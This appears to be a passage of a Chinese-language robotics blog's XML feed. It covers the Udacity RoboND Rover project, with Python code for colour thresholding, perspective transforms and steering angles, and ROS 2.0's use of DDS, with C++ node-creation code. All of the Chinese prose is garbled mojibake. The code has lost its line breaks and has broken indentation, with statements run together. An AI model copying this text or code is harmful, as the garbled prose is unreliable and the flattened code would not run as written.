é‡çœ‹äº†ä¸€éå…©å¹´å‰çš„é‚£ç¯‡å›é¡§ï¼Œç™¼ç¾è‡ªå·±åœ¨è§€å¿µä¸Šé‚„æ˜¯å·®ä¸å¤šçš„ï¼Œé‚„æ˜¯å¾ˆæ³¨é‡åˆ†äº«ï¼Œæ‰€ä»¥é€™å…©å¹´ä¹‹é–“å¾æœªé–“æ–·ã€‚å°æ–¼ã€Œç—›éæ‰èƒ½ç†è§£ã€é‚„æ˜¯æŠ±æŒè‘—ä¸€æ¨£çš„æƒ³æ³•ï¼Œä¹ŸæŠŠé€™äº›æ¦‚å¿µè®Šæˆæ–‡ç« è¨˜éŒ„èµ·ä¾†ï¼Œä¸ç„¶æ¯æåˆ°ä¸€æ¬¡å°±è¦é‡æ–°å†è¬›ä¸€æ¬¡ï¼Œå¾ˆä¸ç¬¦åˆå·¥ç¨‹å¸«çš„æ€§æ ¼ï¼Œèƒ½é‡æ§‹å°±æ‡‰è©²å„˜æ—©é‡æ§‹ã€‚å°æ–¼å»£åº¦èˆ‡æ·±åº¦çš„çœ‹æ³•ï¼Œæ”¯æŒå…ˆå»£å†æ·±ï¼Œå› ç‚ºé‚£æ¨£èµ°éä¾†çš„æˆ‘è¦ºå¾—å¾ˆæœ‰å¹«åŠ©ï¼›è€Œå°å…¬å¸èˆ‡å¤§å…¬å¸çš„å•é¡Œï¼Œç¾åœ¨é‚„æ²’é€²éå¤§å…¬å¸æ‰€ä»¥ç„¡æ³•é«”æœƒï¼Œå¯èƒ½è¦å†éå¥½ä¸€é™£å­æ‰èƒ½è·Ÿå¤§å®¶åˆ†äº«é€™å¡Šçš„å¿ƒå¾—ã€‚
å…¶å¯¦æ¯æ¬¡åœ¨å¯«é€™ç¨®å›é¡§çš„æ™‚å€™ï¼Œéƒ½æœƒå…ˆæ„Ÿå˜†ä¸€ä¸‹æ™‚é–“å°±é€™æ¨£éå»äº†ï¼Œå®Œå…¨æ²’æœ‰æ„è­˜åˆ°å·²ç¶“éäº†å…©å¹´ï¼›ä¸éä¹Ÿå°±æ˜¯å› ç‚ºé€™æ¨£ï¼Œæœƒæ›´è®“äººæœŸå¾…è‡ªå·±ä¸‹ä¸€æ¬¡æœƒè®Šæˆä»€éº¼æ¨£å­ã€‚
å°±é€™æ¨£å•¦ï¼Œæˆ‘å€‘å…©å¹´å¾Œå†è¦‹ï¼
å¦‚æœçœ‹å®Œæœ‰å¿ƒå¾—æƒ³è¦ç•™è¨€ï¼Œæ­¡è¿ç›´æ¥åˆ° GitHub ä¸‹é¢å»ç•™è¨€ï¼Œå› ç‚ºåœ¨é€™åº•ä¸‹ç•™è¨€çš„è©±æˆ‘æ”¶ä¸åˆ°é€šçŸ¥ï¼ŒGitHub çš„è©±æœƒæ¯”è¼ƒå¥½äº¤æµã€‚
é—œæ–¼ä½œè€…ï¼š@huli é‡ç”Ÿå·¥ç¨‹å¸«ï¼Œç›¸ä¿¡åˆ†äº«èˆ‡äº¤æµèƒ½è®“ä¸–ç•Œè®Šå¾—æ›´ç¾å¥½
]]></content>
      <tags>
        <tag>Software Engineer</tag>
      </tags>
  </entry>
  <entry>
    <title>Udacity RoboND - Rover project ç°¡ä»‹</title>
    <url>/2017/08/26/robond-rover/</url>
    <content><![CDATA[å‰è¨€æœ€è¿‘ Udacity çš„ nano degree ç®—æ˜¯æ»¿ç´…çš„ï¼Œä»–å€‘ä¹Ÿæœ‰æŠŠå¾ˆå¤šæ•™å­¸è³‡æºæ”¾åˆ° github ä¸Šé¢ï¼Œä¾‹å¦‚ Rover projectï¼Œæˆ‘è¦ºå¾—æ‹¿ä¾†ä¸Šæ‰‹é‚„ä¸éŒ¯ï¼Œä»¥ä¸‹å°±ç¨å¾®ä¾†ç°¡ä»‹ä¸€ä¸‹é€™å€‹ project æœ‰è¶£çš„åœ°æ–¹ã€‚
Project ç°¡ä»‹
é€™å€‹ project æ˜¯è¦è®“ Rover åœ¨ä¸–ç•Œä¸­è‡ªç”±è‡ªåœ¨åœ°è¡Œèµ°ï¼Œç„¶å¾Œå°‹æ‰¾ç‰¹å®šçš„å²©çŸ³æ¨£æœ¬ä¸¦æ”¶é›†ï¼Œå› ç‚ºä»–å€‘å°‡å²©çŸ³çš„é¡è‰²è¨­è¨ˆå¾—è·ŸèƒŒæ™¯å¾ˆä¸ä¸€æ¨£ï¼Œæ‰€ä»¥æˆ‘å€‘åªè¦å¯ä»¥åœ¨ç’°å¢ƒä¸­èµ°ä¾†èµ°å»ï¼Œç„¶å¾Œä¸€ç›´å°‹æ‰¾ç•«é¢ä¸­æœ‰æ²’æœ‰é»ƒé»ƒçš„ã€åƒæ˜¯é»ƒé‡‘çš„çŸ³é ­å°±å¥½äº†ï¼š

å°æ”¶åˆ°çš„å½±åƒåšè™•ç†ï¼Œå¾—åˆ°å¯ä»¥èµ°çš„å€å¡Šé¦–å…ˆï¼Œæ©Ÿå™¨äººè¦çŸ¥é“å“ªé‚Šå¯ä»¥èµ°ã€å“ªé‚Šä¸èƒ½èµ°ï¼Œæ‰€ä»¥åœ¨æ”¶åˆ° camera çš„å½±åƒå¾Œï¼Œè¦å…ˆè™•ç†ä¸€ä¸‹ï¼Œæ¿¾å‡ºå¯ä»¥èµ°çš„å€å¡Šï¼Œ
import matplotlib.pyplot as pltimport matplotlib.image as mpimgimport numpy as npimage_name = &#x27;sample.jpg&#x27;image = mpimg.imread(image_name)# å› ç‚ºå¯ä»¥èµ°çš„å€å¡Šæ˜¯ç™½è‰²çš„ï¼Œä½¿å‡ºcolor thresholdå¤§æ³•def color_thresh(img, rgb_thresh=(0, 0, 0)):	color_select = np.zeros_like(img[:,:,0])	above_thresh = (img[:,:,0] &gt; rgb_thresh[0]) \				   &amp; (img[:,:,1] &gt; rgb_thresh[1]) \	&amp; (img[:,:,2] &gt; rgb_thresh[2])	color_select[above_thresh] = 1	return color_select	red_threshold = 150	green_threshold = 150	blue_threshold = 150	rgb_threshold = (red_threshold, green_threshold, blue_threshold)# pixels below the thresholdscolorsel = color_thresh(image, rgb_thresh=rgb_threshold)# Display the original image and binaryf, (ax1, ax2) = plt.subplots(1, 2, figsize=(21, 7), sharey=True)f.tight_layout()ax1.imshow(image)ax1.set_title(&#x27;Original Image&#x27;, fontsize=40)ax2.imshow(colorsel, cmap=&#x27;gray&#x27;)ax2.set_title(&#x27;Your Result&#x27;, fontsize=40)plt.subplots_adjust(left=0., right=1, top=0.9, bottom=0.)plt.show()

é€™æ¨£å°±å¯ä»¥ç•«å‡ºçµæœäº†:

ç”¢ç”Ÿåœ°åœ–é›–ç„¶æˆ‘å€‘å¾å½±åƒä¸­ï¼Œå¾—çŸ¥äº†ç›®å‰å¯ä»¥èµ°çš„å€å¡Šï¼Œä½†éš¨è‘—æ©Ÿå™¨äººä¸€ç›´èµ°ä¾†èµ°å»ï¼Œå°±æœƒå¾—åˆ°ä¸€å¼µå¼µçš„å½±åƒï¼Œæ¯å¼µè£¡é¢éƒ½æœ‰å¯ä»¥èµ°çš„å€å¡Šã€‚å¦‚æœå¯ä»¥æŠŠé€™ä¸€å¼µå¼µçš„å½±åƒæ¥èµ·ä¾†ï¼Œè®Šæˆåœ°åœ–ï¼Œé‚£äº‹æƒ…å°±æœƒæ–¹ä¾¿è¨±å¤šï¼æ‰€ä»¥æˆ‘å€‘å¯ä»¥é€é perspective transform å°‡å½±åƒè®Šæˆå¾ä¿¯è¦–çš„ view è§€çœ‹ï¼Œç„¶å¾Œå†å°‡å½±åƒè½‰æ›åˆ°ä»¥ Rover ç‚ºä¸­å¿ƒçš„åæ¨™ç³»å°±å¯ä»¥äº†ã€‚
import numpy as npimport cv2import matplotlib.image as mpimgdef perspect_transform(img, src, dst):# Get transform matrix using cv2.getPerspectivTransform()	M = cv2.getPerspectiveTransform(src, dst)# Warp image using cv2.warpPerspective()# keep same size as input imagewarped = cv2.warpPerspective(img, M, (img.shape[1], img.shape[0]))# Return the resultreturn warpeddef color_thresh(img, rgb_thresh=(160, 160, 160)):# Create an array of zeros same xy size as img, but single channel	color_select = np.zeros_like(img[:,:,0])# Require that each pixel be above all thre threshold values in RGB# above_thresh will now contain a boolean array with &quot;True&quot;# where threshold was metabove_thresh = (img[:,:,0] &gt; rgb_thresh[0]) \			   &amp; (img[:,:,1] &gt; rgb_thresh[1]) \			   &amp; (img[:,:,2] &gt; rgb_thresh[2])# Index the array of zeros with the boolean array and set to 1			   color_select[above_thresh] = 1# Return the binary image			   return color_select			   image = mpimg.imread(&#x27;sample.jpg&#x27;)			   dst_size = 5			   bottom_offset = 6# é€™é‚Šçš„å®šç¾©æ˜¯è¦çµ¦ perspective transform ç”¨çš„ï¼Œå…ˆå®šç¾©åŸåœ–ä¸­çš„æŸäº›é»ï¼Œå†å®šç¾©æƒ³è¦æ‰­æˆæŸå€‹å½¢ç‹€çš„åœ–ä¸­é‚£äº›é»çš„ä½ç½®			   source = np.float32([[14, 140], [301 ,140],[200, 96], [118, 96]])destination = np.float32([[image.shape[1]/2 - dst_size, image.shape[0] - bottom_offset],		[image.shape[1]/2 + dst_size, image.shape[0] - bottom_offset],		[image.shape[1]/2 + dst_size, image.shape[0] - 2*dst_size - bottom_offset],		[image.shape[1]/2 - dst_size, image.shape[0] - 2*dst_size - bottom_offset],		])

import matplotlib.pyplot as pltimport matplotlib.image as mpimgimport numpy as npimport cv2from extra_functions import perspect_transform, color_thresh, source, destinationimage = mpimg.imread(&#x27;sample.jpg&#x27;)# è½‰æ›åˆ°ä»¥ Rover ç‚ºä¸­å¿ƒçš„åº§æ¨™ç³»def rover_coords(binary_img):	y_pos, x_pos = binary_img.nonzero()	x_pixel = -(y_pos - binary_img.shape[0])	y_pixel = -(x_pos - binary_img.shape[1]/2 )	return x_pixel, y_pixel# Perform warping and color thresholding	warped = perspect_transform(image, source, destination)colorsel = color_thresh(warped, rgb_thresh=(160, 160, 160))xpix, ypix = rover_coords(colorsel)# Plot the map in rover-centric coordsfig = plt.figure(figsize=(5, 7.5))plt.plot(xpix, ypix, &#x27;.&#x27;)plt.ylim(-160, 160)plt.xlim(0, 160)plt.title(&#x27;Rover-Centric Map&#x27;, fontsize=20)

ç¶œåˆèµ·ä¾†ï¼Œå°±å¯ä»¥å¾—åˆ°

æ ¹æ“šåœ°åœ–ç”¢ç”Ÿæ–°çš„ç§»å‹•æ–¹å‘å‡è¨­å·²ç¶“æœ‰äº†åœ°åœ–ï¼Œä¸‹ä¸€æ­¥å°±æ˜¯å¸Œæœ›å¾—åˆ°è¦èµ°çš„æ–¹å‘ï¼Œæœ€ç°¡å–®çš„æƒ³æ³•å°±æ˜¯æŒ‘å¯ä»¥èµ°çš„ç¯„åœçš„ä¸­ç·šï¼Œå› ç‚ºé›¢éšœç¤™ç‰©æœ€é ã€‚ä½†æˆ‘å€‘å‰é¢çš„è¡¨ç¤ºæ³•ï¼Œæ˜¯æŠŠæ¯å€‹ pixel ç”¨ (x,y) é€™ç¨®ç¬›å¡çˆ¾åæ¨™ç³»ä¸‹çš„å®šç¾©ä¾†å„²å­˜ä½ç½®ï¼Œå³ä¾¿æˆ‘å€‘æœ‰é€™äº›å¯è¡Œèµ°å€åŸŸçš„ (x,y) ä½ç½®ï¼Œè¦å¾é€™äº› (x,y) pair ä¸­æ‰¾å‡ºä¸­ç·šé‚„æ˜¯é —éº»ç…©çš„ã€‚
æ‰€ä»¥é€™é‚Šå°±æœƒç”¨åˆ°å°æ™‚å€™å­¸éçš„æ¥µåº§æ¨™å•¦ï¼Œå¤§å®¶å¯ä»¥æƒ³ä¸€æƒ³ï¼Œå¦‚æœæˆ‘å€‘æœ‰æ¯ä¸€å€‹å¯èµ°å€åŸŸçš„ pixel çš„æ¥µåº§æ¨™ï¼Œé‚£æ˜¯ä¸æ˜¯æŠŠæ¯ä¸€å€‹é»çš„è§’åº¦éƒ½å¹³å‡ä¸€ä¸‹ï¼Œå°±å¯ä»¥å¾—åˆ°è¦è¡Œèµ°çš„è§’åº¦äº†å‘¢ï¼Ÿ
æ ¹æ“šä¸Šé¢çš„è§€å¿µï¼Œæˆ‘å€‘å°±å†å¯«ä¸€ä¸‹å¾ç¬›å¡çˆ¾åº§æ¨™è½‰æ›æˆæ¥µåº§æ¨™çš„ functionï¼š
import matplotlib.pyplot as pltimport matplotlib.image as mpimgimport numpy as npfrom extra_functions import perspect_transform, color_thresh, rover_coords# åªè¦å®šç¾©ä¸€å€‹å°‡pixelå¾ç¬›å¡çˆ¾åº§æ¨™è½‰æˆæ¥µåº§æ¨™çš„functionå°±å¥½def to_polar_coords(xpix, ypix):	dist = np.sqrt(xpix**2 + ypix**2)	angles = np.arctan2(ypix, xpix)	return dist, angles	image = mpimg.imread(&#x27;angle_example.jpg&#x27;)	warped = perspect_transform(image) # Perform perspective transform	colorsel = color_thresh(warped, rgb_thresh=(160, 160, 160)) # Threshold the warped image	xpix, ypix = rover_coords(colorsel) # Convert to rover-centric coords	distances, angles = to_polar_coords(xpix, ypix) # Convert to polar coords	avg_angle = np.mean(angles) # Compute the average angle# Plot	fig = plt.figure(figsize=(12,9))plt.subplot(221)plt.imshow(image)plt.subplot(222)plt.imshow(warped)plt.subplot(223)plt.imshow(colorsel, cmap=&#x27;gray&#x27;)plt.subplot(224)plt.plot(xpix, ypix, &#x27;.&#x27;)plt.ylim(-160, 160)plt.xlim(0, 160)arrow_length = 100x_arrow = arrow_length * np.cos(avg_angle)y_arrow = arrow_length * np.sin(avg_angle)plt.arrow(0, 0, x_arrow, y_arrow, color=&#x27;red&#x27;, zorder=2, head_width=10, width=2)plt.show()

å°±å¯ä»¥ç•«å‡ºä¸‹åœ–:

ç¸½çµä»Šå¤©è·Ÿå¤§å®¶ç°¡å–®ä»‹ç´¹äº†ä¸€ä¸‹ Udacity çš„å­¸ç¿’è³‡æºï¼Œä¹Ÿç°¡ä»‹äº†ä¸€é»é» Rover project çš„å…§å®¹ï¼Œæˆ‘è‡ªå·±è¦ºå¾—ä»–å€‘çš„ project è¨­è¨ˆéƒ½é‚„ä¸éŒ¯ï¼Œå€¼å¾—ç©ä¸€ç©ï¼Œé©åˆæƒ³è¦å…¥é–€çš„è®€è€…åƒè€ƒã€‚
å»¶ä¼¸é–±è®€
RoboND Kinematics Project
RoboND Perception Project

é—œæ–¼ä½œè€…ï¼š@pojenlai æ¼”ç®—æ³•å·¥ç¨‹å¸«ï¼Œå°æ©Ÿå™¨äººè·Ÿé›»è…¦è¦–è¦ºæœ‰å°‘è¨±ç ”ç©¶ï¼Œæœ€è¿‘åœ¨å­¸ç¿’çœ‹æ¸…äº‹ç‰©çš„æœ¬è³ªèˆ‡æ”¹é€²è‡ªå·±çš„è§€å¿µ
]]></content>
      <tags>
        <tag>robot, navigation, rover,</tag>
      </tags>
  </entry>
  <entry>
    <title>ç”¨ DDS é–‹ç™¼ ROS 2.0</title>
    <url>/2016/04/15/ros-2-dds/</url>
    <content><![CDATA[å‰è¨€é€™ç¯‡æ–‡ç« æƒ³è¦å‘å¤§å®¶ä»‹ç´¹ROS 2.0çš„åº•å±¤å¯¦ä½œæ¦‚å¿µï¼Œé›–ç„¶æ¯”è¼ƒä¸æœƒæœ‰ç¨‹å¼å¯¦ä½œçš„è¨è«–ï¼Œä½†æˆ‘è¦ºå¾—é€™ä¸€å¡Šçš„æ·±åº¦æ»¿å€¼å¾—ä»‹ç´¹çš„ï¼Œå› ç‚ºä½¿ç”¨ROSæœ‰å¥½å¹¾ç¨®å±¤æ¬¡:

ä½¿ç”¨ROSçš„å„ç¨®å·¥å…·ä¾†å»ºç«‹è‡ªå·±çš„æ‡‰ç”¨
åœ¨é–‹ç™¼ä¸Šç¢°åˆ°ä¸€äº›å•é¡Œï¼Œä¿®æ”¹ç¾æˆçš„packageä¾†æ»¿è¶³è‡ªå·±çš„éœ€æ±‚
é–‹ç™¼è‡ªå·±çš„æ¼”ç®—æ³•ï¼Œç™¼å¸ƒè‡ªå·±çš„packageçµ¦å…¶ä»–äººä½¿ç”¨
å”åŠ©é–‹ç™¼èˆ‡ç¶­è­·ROSçš„æ ¸å¿ƒ

é€™ç¯‡æ–‡ç« è¦è¨è«–çš„è­°é¡Œå·²ç¶“è½åœ¨ç¬¬å››å€‹å±¤æ¬¡ï¼Œæ‰€ä»¥å°æ–¼ä¸€èˆ¬çš„ä½¿ç”¨è€…ä¾†èªªï¼Œå¯èƒ½ä¸å¤ªå…·æœ‰ç›´æ¥æ‡‰ç”¨çš„åƒ¹å€¼ï¼Œä½†å¦‚æœå°æ–¼ROSçš„åº•å±¤å¯¦ä½œæœ‰æ›´æ·±å…¥çš„ç†è§£(çŸ¥é“ä»–æ˜¯æ€éº¼é–‹ç™¼å‡ºä¾†çš„ã€æœ‰å“ªäº›é™åˆ¶ã€æœ‰å“ªäº›å„ªé»)ï¼Œå°±å¯ä»¥åœ¨åˆ©ç”¨ROSæ’°å¯«è‡ªå·±çš„æ‡‰ç”¨æ™‚ï¼Œæ›´èƒ½é–‹ç™¼å‡ºæ•ˆèƒ½æœ€ä½³åŒ–çš„æ‡‰ç”¨ã€‚
ç‚ºä»€éº¼è¦é–‹ç™¼ROS 2.0?äº‹å¯¦ä¸Šï¼Œå¦‚æœROS 1.0 å·²ç¶“è¶³å¤ å®Œç¾ï¼Œé‚£æˆ‘å€‘å°±æ²’æœ‰å¿…è¦è¨è«–ROS 2.0ã€‚ä¸éäº‹æƒ…ç•¶ç„¶ä¸æ˜¯é€™æ¨£ï¼Œå› ç‚ºROS 1.0åœ¨é–‹ç™¼çš„æ™‚å€™ï¼Œæ˜¯åœç¹è‘—ä¸€éš»æ©Ÿå™¨äººä¾†é–‹ç™¼çš„ï¼Œé›–ç„¶ç•¶åˆçš„è¨­è¨ˆå·²ç¶“è®“ROSè®Šå¾—å¾ˆæœ‰å½ˆæ€§ï¼Œå¯ä»¥è¢«æ‡‰ç”¨åœ¨å„å¼å„æ¨£çš„æ©Ÿå™¨äººä¸Šï¼Œä½†æ˜¯éš¨è‘—ä½¿ç”¨è€…è¶Šä¾†è¶Šå¤šï¼Œè¶…ä¹é–‹ç™¼è€…æƒ³åƒçš„ä½¿ç”¨æƒ…å¢ƒä¹Ÿè¶Šä¾†è¶Šå¤šã€‚
ä¹Ÿå°±æ˜¯èªªï¼Œå¦‚æœé–‹ç™¼è€…å€‘ä¸ç©æ¥µåœ°é–‹å§‹é–‹ç™¼ä¸‹ä¸€ä»£çš„ROSï¼Œé²æ—©æœƒç„¡æ³•æ»¿è¶³è¶Šä¾†è¶Šè¤‡é›œè€Œå¤šæ¨£åŒ–çš„éœ€æ±‚ã€‚å°æ–¼é€™äº›ä½¿ç”¨æƒ…å¢ƒçš„å…·é«”æè¿°ï¼Œå¯ä»¥åƒè€ƒé€™è£¡ã€‚
é–‹ç™¼ROSç³»çµ±éœ€è¦å¯¦ç¾çš„æ¨¡å¡Šé¦–å…ˆä¾†è«‡è«–ä¸€ä¸‹å»ºç«‹æ•´å€‹ç³»çµ±ä¸Šï¼Œéœ€è¦è€ƒæ…®çš„å¹¾å€‹é‡é»:

DiscoveryåŠŸèƒ½
Publisher-SubscriberåŠŸèƒ½
Service èˆ‡ ActionåŠŸèƒ½

DiscoveryåŠŸèƒ½çš„æ„ç¾©æ˜¯ï¼Œåªè¦æœ‰æ–°çš„nodeå•Ÿå‹•ï¼Œå°±èƒ½åœ¨æ•´å€‹ROS nodeçš„ç¶²è·¯ä¸­è¢«çœ‹è¦‹(æ¦‚å¿µå¾ˆåƒæ˜¯æˆ‘æ‰“é–‹æ‰‹æ©Ÿçš„wifiç†±é»åˆ†äº«ï¼Œå…¶ä»–è£ç½®å°±æ‡‰è©²è¦å¯ä»¥ç™¼ç¾æœ‰é€™å€‹wifiç†±é»)ã€‚
æ¥ä¸‹ä¾†çš„Publisher-SubscriberåŠŸèƒ½ã€ServiceåŠŸèƒ½è·ŸActionåŠŸèƒ½å…¶å¯¦å°±æ˜¯ROSä½¿ç”¨è€…ç†Ÿæ‚‰çš„Topicã€Serviceè·ŸActionlibå•¦ï¼Œæœ¬è³ªä¸Šé€™å¹¾ç¨®åŠŸèƒ½åœ¨è™•ç†çš„éƒ½æ˜¯nodeä¹‹é–“çš„æºé€š(ä¹Ÿå°±æ˜¯ç¨‹å¼ä¹‹é–“çš„æºé€šï¼Œå¤§å®¶å¯ä»¥æƒ³åƒè¦è®“ä¸€éš»æ©Ÿå™¨äººæ­£å¸¸é‹ä½œï¼Œé›»è…¦ä¸Šéœ€è¦é‹è¡Œçš„ç¨‹å¼ä¸€å®šæ˜¯å¾ˆå¤šå€‹ï¼Œè€Œä¸”éœ€è¦å½¼æ­¤æºé€šï¼Œæ‰€ä»¥åº•å±¤çš„æºé€šæ©Ÿåˆ¶éœ€è¦æœ‰äººä¾†å¯¦ä½œï¼Œä¸ç„¶å°±æ˜¯â€¦æƒ³é–‹ç™¼æ©Ÿå™¨äººç¨‹å¼çš„ä½ å¾—è‡ªå·±å¯¦ä½œ)ã€‚å¦‚æœä½ ä¸å¤ªç¢ºå®šè‡ªå·±çŸ¥ä¸çŸ¥é“æˆ‘åœ¨èªªä»€éº¼ï¼Œå¯ä»¥çœ‹çœ‹é€™ä¸€ç¯‡å€åˆ†Topicã€Serviceè·ŸActionlibçš„æ–‡ç« ã€‚
DDSçš„ç³»çµ±å±¤æ¦‚å¿µæƒ³è¦å¯¦ä½œä¸Šé¢é€™äº›åŠŸèƒ½ï¼ŒDDSä¸¦ä¸æ˜¯å”¯ä¸€çš„é¸æ“‡ï¼Œä½†æ˜¯ï¼ŒOSRF(Open Source Robotic Foundation)çš„é–‹ç™¼è€…ç¶“éå˜—è©¦ä¹‹å¾Œï¼Œè¦ºå¾—é€™æ˜¯æœ€å¥½çš„é–‹ç™¼é¸é …ã€‚ç´°ç¯€ç†ç”±å¯ä»¥çœ‹å»¶ä¼¸é–±è®€çš„ç¬¬3ç¯‡æ–‡ç« ï¼Œé€™éƒ¨åˆ†å·²ç¶“æœ‰ä¸­æ–‡ç¿»è­¯äº†ã€‚

å¾ä¸Šé¢é€™å¼µåœ–å¯ä»¥æ¸…æ¥šåœ°çœ‹å‡ºï¼Œä½¿ç”¨è€…æ‰€éœ€è¦æ¥è§¸åˆ°çš„åªæœ‰æœ€ä¸Šé¢çš„å…©å±¤ã€‚ä½¿ç”¨è€…è‡ªå·±å¯«çš„codeå°±å±¬æ–¼Userland Codeï¼Œè€Œä½¿ç”¨è€…è‡ªå·±å¯«çš„codeä¸­å‘¼å«åˆ°çš„ROS API (ä¾‹å¦‚ros::init())å°±å±¬æ–¼ROS client library APIï¼Œè€ŒDDSçš„APIå‰‡æ˜¯åœ¨æ›´åº•å±¤è¢«ROS client library APIæ‰€ä½¿ç”¨ã€‚
æœ‰è¶£çš„åœ°æ–¹æ˜¯ï¼Œç‚ºäº†ä¿æŒå½ˆæ€§ï¼ŒOSRFçš„é–‹ç™¼è€…å€‘å¸Œæœ›ä½¿ç”¨è€…å¯ä»¥è‡ªå·±é¸æ“‡åº•å±¤ä½¿ç”¨çš„æ˜¯å“ªä¸€å€‹ç‰ˆæœ¬çš„DDS (DDSåƒæ˜¯ä¸€ç¨®æ¨™æº–ï¼Œæ‰€ä»¥å¯ä»¥æœ‰ä¸åŒå…¬å¸æä¾›è‡ªå·±çš„å¯¦ä½œç‰ˆæœ¬)ã€‚
ä¸€é»ç´°ç¯€çš„å»¶ä¼¸ä¸Šé¢è¨è«–çš„éƒ½æ˜¯æ¦‚å¿µçš„ç†è§£ï¼Œå°æ–¼æŠ€è¡“æœ‰èˆˆè¶£çš„ä½ æƒ³å¿…æ²’è¾¦æ³•æ¥å—ï¼Œæ‰€ä»¥å°±è®“æˆ‘å€‘ä¾†çœ‹ä¸€é»æŠ€è¡“ç´°ç¯€å§!
æˆ‘å€‘é‚„æ˜¯ä¸€æ¨£å…ˆç«™åœ¨é–‹ç™¼è€…çš„è§’åº¦ï¼Œæœ€åŸºæœ¬æˆ‘å€‘éœ€è¦æä¾›çš„å·¥å…·å°±æ˜¯Nodeåˆå§‹åŒ–çš„å‡½å¼å°å§ï¼Œé€™å€‹å‡½å¼çš„é•·ç›¸å°±åƒ:
Node::Node(std::string name): running_(true)&#123;	/*----------------------è¦ªåˆ‡çš„ä¸­æ–‡è¨»è§£ä¾†å›‰!!!----------------------*/	nodes_.push_back(this);	subscription_iterator_ = subscriptions_.end();	name_ = name;	//å–å¾—äº†DDSçš„DomainParticipantFactoryçš„instanceï¼Œå¾ˆåƒæ˜¯ä¸€å€‹nodeç”¢ç”Ÿå™¨çš„æ„Ÿè¦º	dpf_ = DDS::DomainParticipantFactory::get_instance();	checkHandle(dpf_.in(), &quot;DDS::DomainParticipantFactory::get_instance&quot;);	DDS::DomainId_t domain = DDS::DOMAIN_ID_DEFAULT; 	//å¯¦éš›ç”¢ç”Ÿä¸€å€‹participantï¼Œæ‡‰è©²å°±æ˜¯ä¸€å€‹node	participant_ = create_participant( domain, PARTICIPANT_QOS_DEFAULT, NULL,DDS::STATUS_MASK_NONE);	checkHandle(participant_.in(), &quot;DDS::DomainParticipantFactory::create_participant&quot;);	/*----------------------çœ‹åˆ°é€™è£¡å°±å¥½å›‰!!!----------------------*/ 	// Create the default QoS for Topics	DDS::ReturnCode_t status = participant_get_default_topic_qos(default_topic_qos_);	checkStatus(status, &quot;DDS::DomainParticipant::get_default_topic_qos&quot;);	default_topic_qos_.reliability.kind = DDS::BEST_EFFORT_RELIABILITY_QOS; 	// Create the default QoS for Publishers	status = participant_get_default_publisher_qos(default_publisher_qos_);	checkStatus(status, &quot;DDS::DomainParticipant::get_default_publisher_qos&quot;);	default_publisher_qos_.partition.name.length(1);	default_publisher_qos_.partition.name[0] = &quot;ros_partition&quot;; 	// Create the default QoS for Subscribers	status = participant_get_default_subscriber_qos(default_subscriber_qos_);	checkStatus(status, &quot;DDS::DomainParticipant::get_default_publisher_qos&quot;);	default_subscriber_qos_.partition.name.length(1);	default_subscriber_qos_.partition.name[0] = &quot;ros_partition&quot;; 	// Create a waitset for spin	waitset_ = new DDS::WaitSet();	// Create a parameter server for this node	create_parameter_server(name);&#125;

å¤§å®¶å…ˆä¸è¦åš‡åˆ°ï¼Œä¸€ä¸‹æœ‰å¤ªå¤šç´°ç¯€æœ¬ä¾†å°±ä¸å¯èƒ½çœ‹æ‡‚ï¼Œå¤§å®¶åªéœ€è¦çœ‹æˆ‘ç”¨è¨»è§£æ¨™è¨˜èµ·ä¾†çš„å€åŸŸï¼Œé«”é©—ä¸€ä¸‹ä»€éº¼å«åšROS client library APIå‘¼å«DDS APIçš„æ„Ÿè¦ºå°±å¥½ã€‚
é‚£å°æ–¼ä¸€å€‹ä½¿ç”¨è€…ä¾†èªªï¼Œå‡è¨­æˆ‘ä»Šå¤©è¦å•Ÿå‹•ä¸€éš»æ©Ÿå™¨äººï¼Œé‚£å°±éœ€è¦å‘¼å«å»ºç«‹nodeçš„å‡½å¼ï¼Œçœ‹èµ·ä¾†å°±åƒ:
TurtleApp(int&amp; argc, char** argv): QApplication(argc, argv)&#123;	rclcpp::init(argc, argv);	nh_ = rclcpp::create_node(&quot;turtlesim&quot;);&#125;

ä½ ä¸€å®šè¦ºå¾—å¥‡æ€ªï¼Œrclcpp::create_node()è·Ÿä¸Šé¢æˆ‘è¬›çš„Node::Node()å»ºæ§‹å­æ ¹æœ¬æ¥ä¸èµ·ä¾†å•Š? æ‰€ä»¥é€™é‚Šå°±è¦è£œä¸Šä¸€é»é»ç¨‹å¼ç¢¼ï¼Œæƒ³å¿…ä½ å°±æ‡‚äº†:
void rclcpp::init(int argc, char** argv)&#123;	if (globally_initialized)	&#123;		throw AlreadyInitializedError();	&#125;		/* Register a signal handler so DDS doesn not just sit there... */	if (signal(SIGINT, Node::static_signal_handler) == SIG_ERR)	&#123;		fputs(&quot;An error occurred while setting a signal handler.\n&quot;, stderr);	&#125;	globally_initialized = true;&#125; Node::Ptr rclcpp::create_node(const std::string &amp;name)&#123;	return Node::Ptr(new Node(name));&#125;

ç¸½çµOK!ç°¡ä»‹å°±åˆ°é€™é‚Šå•¦ï¼Œå¦‚æœå°æ–¼å¯¦ä½œç´°ç¯€æœ‰èˆˆè¶£æ·±å…¥çš„è®€è€…ï¼Œä¸å¦¨å»çœ‹çœ‹ROS 2.0çš„github repoï¼Œè©³ç´°çš„ç¨‹å¼ç¢¼å…¨éƒ¨éƒ½æ˜¯é–‹æºçš„ï¼Œæ‰€ä»¥å¯ä»¥å¾ä¸­å­¸ç¿’é–‹ç™¼çš„ç´°ç¯€ã€‚
å»¶ä¼¸é–±è®€
ç‚ºä»€éº¼è¦é–‹ç™¼ROS 2.0?
ä½¿ç”¨ZeroMQè·Ÿç›¸é—œçš„å‡½å¼åº«ä¾†é–‹ç™¼ROS
ä½¿ç”¨DDSä¾†é–‹ç™¼ROS (ä»åœ¨è¶•å·¥ä¸­ï¼Œæ­¡è¿é–‹issueå‚¬ä¿ƒç¿»è­¯è€…QQ)
ROS 2.0 wiki
ROS DDS Prototype (Github Repo)

é—œæ–¼ä½œè€…ï¼š@pojenlai æ¼”ç®—æ³•å·¥ç¨‹å¸«ï¼Œå°æ©Ÿå™¨äººè·Ÿé›»è…¦è¦–è¦ºæœ‰å°‘è¨±ç ”ç©¶ï¼Œæœ€è¿‘åœ¨é›éŠè‡ªå·±çš„åŸ·è¡ŒåŠ›
]]></content>
      <tags>
        <tag>æ©Ÿå™¨äºº, Robot, ROS, DDS</tag>
      </tags>
  </entry>
  <entry>
    <title>Caffe &amp; GoogLeNetï¼Œæ€éº¼å¹«åŠ©æ©Ÿå™¨äººæ›´å¥½åœ°è¾¨è­˜ç‰©é«”</title>
    <url>/2016/03/19/ros-caffe/</url>
